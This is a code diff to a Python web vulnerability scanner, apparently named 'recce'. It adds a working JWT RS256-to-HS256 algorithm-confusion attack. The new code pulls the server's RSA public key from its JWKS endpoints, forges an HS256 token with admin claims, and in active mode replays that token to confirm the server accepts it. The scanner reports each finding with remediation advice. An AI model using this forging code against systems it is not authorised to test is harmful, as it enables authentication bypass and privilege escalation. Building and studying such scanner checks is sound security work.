@@ -1277,6 +1277,112 @@ def _forge_hs(token: str, secret: str, extra_claims: dict) -> str | None:
     return f"{head}.{pay}.{sig}"
 
 
+# --- RS256 -> HS256 algorithm confusion (sign with the PUBLIC key as the HMAC secret) ---
+_JWKS_PATHS = ["/.well-known/jwks.json", "/jwks.json", "/jwks", "/oauth2/jwks",
+               "/oauth/jwks", "/api/jwks", "/.well-known/openid-configuration"]
+
+
+def _der_len(n: int) -> bytes:
+    if n < 0x80:
+        return bytes([n])
+    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
+    return bytes([0x80 | len(b)]) + b
+
+
+def _der(tag: int, content: bytes) -> bytes:
+    return bytes([tag]) + _der_len(len(content)) + content
+
+
+def _der_uint(x: int) -> bytes:
+    b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
+    if b[0] & 0x80:
+        b = b"\x00" + b                       # keep it a positive INTEGER
+    return _der(0x02, b)
+
+
+def _rsa_pubkey_pem(n: int, e: int) -> str:
+    """Reconstruct the SubjectPublicKeyInfo PEM for an RSA public key from (n, e) -
+    the exact bytes a JWT library uses as the HMAC key in an alg-confusion attack."""
+    rsa = _der(0x30, _der_uint(n) + _der_uint(e))                 # RSAPublicKey (PKCS#1)
+    alg = _der(0x30, _der(0x06, bytes.fromhex("2a864886f70d010101")) + _der(0x05, b""))
+    spki = _der(0x30, alg + _der(0x03, b"\x00" + rsa))            # SubjectPublicKeyInfo
+    b64 = base64.b64encode(spki).decode()
+    lines = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
+    return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----\n"
+
+
+def _b64url_uint(s: str) -> int:
+    return int.from_bytes(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)), "big")
+
+
+def _fetch_jwks_pubkey(ip: str, port: Port, auth) -> str | None:
+    """Find the server's RSA public key (JWKS / OIDC discovery) and return it as a PEM."""
+    for path in _JWKS_PATHS:
+        r = _fetch(ip, port, path, auth=auth)
+        if not r or r[0] != 200 or not r[2]:
+            continue
+        try:
+            d = json.loads(r[2])
+        except (ValueError, TypeError):
+            continue
+        if isinstance(d, dict) and d.get("jwks_uri"):             # OIDC discovery -> jwks
+            rr = _fetch(ip, port, urlparse(d["jwks_uri"]).path or "/", auth=auth)
+            if rr and rr[0] == 200:
+                try:
+                    d = json.loads(rr[2])
+                except (ValueError, TypeError):
+                    continue
+        keys = d.get("keys") if isinstance(d, dict) else None
+        if not isinstance(keys, list):
+            continue
+        for k in keys:
+            if isinstance(k, dict) and k.get("kty") == "RSA" and k.get("n") and k.get("e"):
+                try:
+                    return _rsa_pubkey_pem(_b64url_uint(k["n"]), _b64url_uint(k["e"]))
+                except (ValueError, TypeError):
+                    continue
+    return None
+
+
+def _forge_alg_confusion(token: str, pem: str) -> str | None:
+    """Forge an HS256 token (escalated claims) signed with the RSA public-key PEM as the
+    HMAC secret - what a server that accepts HS256 with the same key would validate."""
+    parts = token.split(".")
+    payraw = _b64url(parts[1]) if len(parts) > 1 else None
+    if payraw is None:
+        return None
+    try:
+        claims = json.loads(payraw)
+    except (ValueError, TypeError):
+        return None
+    if not isinstance(claims, dict):
+        return None
+    claims = {**claims, "admin": True, "role": "admin", "recce": 1}
+    head = _b64url_enc(json.dumps({"alg": "HS256", "typ": "JWT"},
+                                  separators=(",", ":")).encode())
+    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
+    sig = _b64url_enc(hmac.new(pem.encode(), f"{head}.{pay}".encode(),
+                               hashlib.sha256).digest())
+    return f"{head}.{pay}.{sig}"
+
+
+def _replay_forged(ip: str, port: Port, path: str, loc: str, cookie_name, real, forged):
+    """Replay a forged token vs the real token vs no token. Returns confirmed / rejected /
+    inconclusive, or None if the probes failed."""
+    authed = _jwt_replay(ip, port, path, loc, cookie_name, real)
+    anon = _jwt_replay(ip, port, path, loc, cookie_name, None)
+    frg = _jwt_replay(ip, port, path, loc, cookie_name, forged)
+    if not (authed and anon and frg):
+        return None
+    if _resp_same(authed, anon):
+        return "inconclusive"
+    if _resp_same(frg, authed):
+        return "confirmed"
+    if _resp_same(frg, anon):
+        return "rejected"
+    return "inconclusive"
+
+
 def _scan_jwts(ip: str, port: Port, headers: dict, body: str,
                active: bool = False) -> list[Vuln]:
     out: list[Vuln] = []
@@ -1342,12 +1448,42 @@ def _scan_jwts(ip: str, port: Port, headers: dict, body: str,
                                "Use a long random secret (or RS256); rotate it.",
                                confidence="potential"))
         elif alg.startswith(("rs", "es", "ps")):
-            out.append(_mk(ip, port, "web-jwt", "info",
-                           f"JWT uses {alg.upper()} (check RS256->HS256 key-confusion)", ["CWE-347"],
-                           f"JWT header alg={alg.upper()} ({red}). Test the algorithm-confusion "
-                           "attack (sign with the public key as an HS256 secret).",
-                           "Pin the algorithm; don't accept alg switching.",
-                           confidence="potential"))
+            pem = _fetch_jwks_pubkey(ip, port, None) if alg.startswith("rs") else None
+            forged = _forge_alg_confusion(tok, pem) if pem else None
+            if forged:
+                verdict = None
+                if active:
+                    verdict = _replay_forged(ip, port, "/", loc, cookie_name, tok, forged)
+                if verdict == "confirmed":
+                    out.append(_mk(ip, port, "web-jwt", "critical",
+                                   "JWT RS256->HS256 algorithm confusion (forged token accepted)",
+                                   ["CWE-347"],
+                                   f"The {alg.upper()} JWT ({red}) - recce recovered the RSA "
+                                   "public key from the server's JWKS, forged an HS256 token "
+                                   "signed with that public key, and the server ACCEPTED it "
+                                   "(same authenticated response as the real token). Tokens "
+                                   f"are forgeable with any claims.\n\nForged admin token: {forged}",
+                                   "Pin the expected algorithm server-side; never accept HS* "
+                                   "when the key is an RSA public key.", confidence="confirmed"))
+                elif verdict != "rejected":
+                    out.append(_mk(ip, port, "web-jwt", "high",
+                                   "JWT RS256->HS256 algorithm-confusion (forged token minted)",
+                                   ["CWE-347"],
+                                   f"The {alg.upper()} JWT ({red}) - recce recovered the RSA "
+                                   "public key from the server's JWKS and minted an HS256 token "
+                                   "signed with it. If the server verifies HS* with the same "
+                                   "key it accepts this (auth bypass / privilege escalation); "
+                                   f"replay it on a token-gated path to confirm.\n\nForged token: {forged}",
+                                   "Pin the algorithm server-side; never accept HS* with the "
+                                   "RSA public key.", confidence="potential"))
+            else:
+                out.append(_mk(ip, port, "web-jwt", "info",
+                               f"JWT uses {alg.upper()} (check RS256->HS256 key-confusion)",
+                               ["CWE-347"],
+                               f"JWT header alg={alg.upper()} ({red}). Test the algorithm-"
+                               "confusion attack (sign with the public key as an HS256 secret).",
+                               "Pin the algorithm; don't accept alg switching.",
+                               confidence="potential"))
     return out
 
 
